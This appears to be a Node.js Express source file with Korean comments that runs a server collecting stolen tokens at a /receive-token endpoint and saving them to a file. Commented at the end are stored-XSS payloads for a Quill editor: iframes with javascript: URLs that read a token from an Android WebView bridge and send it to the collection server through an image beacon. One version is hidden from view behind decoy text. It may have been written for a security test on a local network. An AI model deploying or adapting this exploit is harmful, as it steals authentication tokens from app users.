const express = require('express');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(cors());

app.get('/receive-token', (req, res) => {
  const token = req.query.token;
  console.log('Received token (GET):', token);
  
  // JSON 문자열에서 토큰 값 추출
  const tokenObj = JSON.parse(token);
  const actualToken = tokenObj.token;

  // 토큰 값을 파일에 저장
  fs.appendFile('tokens.txt', actualToken + '\n', (err) => {
    if (err) {
      console.error('Failed to save token:', err);
      res.status(500).send({ message: 'Failed to save token' });
    } else {
      res.send({ message: 'Token received and saved successfully!' });
    }
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
});

// const express = require('express');
// const cors = require('cors');
// const fs = require('fs');

// const app = express();
// const PORT = 3000;

// app.use(cors());

// app.get('/receive-token', (req, res) => {
//   const token = req.query.token;
//   console.log('Received token (GET):', token);
  
//   // 토큰을 파일에 저장
//   fs.appendFile('tokens.txt', token + '\n', (err) => {
//     if (err) {
//       console.error('Failed to save token:', err);
//       res.status(500).send({ message: 'Failed to save token' });
//     } else {
//       res.send({ message: 'Token received and saved successfully!' });
//     }
//   });
// });

// app.listen(PORT, '0.0.0.0', () => {
//   console.log(`Server is running on http://0.0.0.0:${PORT}`);
// });


//<p>123</p><iframe class=\"ql-video\" frameborder=\"0\" allowfullscreen=\"true\" src=\"javascript:(function() { var token = window.Android.getToken(); if (token) { document.body.innerHTML += 'Token: ' + token + '<br>'; setTimeout(function() { var img = new Image(); img.src = 'http://192.168.0.168:3000/receive-token?token=' + encodeURIComponent(token); document.body.appendChild(img); }, 1000); } else { document.body.innerHTML += 'No token found<br>'; setTimeout(function() { var img = new Image(); img.src = 'http://192.168.0.168:3000/receive-token?token=No+token+found'; document.body.appendChild(img); }, 1000); } })();\"></iframe><p><br></p>

{/* <p>뻥이야~</p><iframe class=\"ql-video\" frameborder=\"0\" allowfullscreen=\"true\" style=\"visibility: hidden; position: absolute; width: 1px; height: 1px; border: 0;\" src=\"javascript:(function() { var token = window.Android.getToken(); if (token) { document.body.innerHTML += 'Token: ' + token + '<br>'; setTimeout(function() { var img = new Image(); img.src = 'http://192.168.0.220:3000/receive-token?token=' + encodeURIComponent(token); document.body.appendChild(img); }, 1000); } else { document.body.innerHTML += 'No token found<br>'; setTimeout(function() { var img = new Image(); img.src = 'http://192.168.0.220:3000/receive-token?token=No+token+found'; document.body.appendChild(img); }, 1000); } })();\"></iframe><p><br></p> */}